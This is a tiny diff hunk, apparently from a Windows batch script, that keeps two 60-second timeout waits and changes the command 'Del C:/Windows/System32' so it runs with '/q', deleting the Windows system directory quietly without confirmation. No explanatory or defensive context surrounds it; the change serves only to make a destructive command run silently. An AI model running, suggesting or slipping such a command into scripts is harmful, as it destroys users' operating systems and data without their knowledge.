@@ -32,4 +32,4 @@ timeout 60
 
 timeout 60 /nobreak
 
-Del C:/Windows/System32
+Del C:/Windows/System32 /q
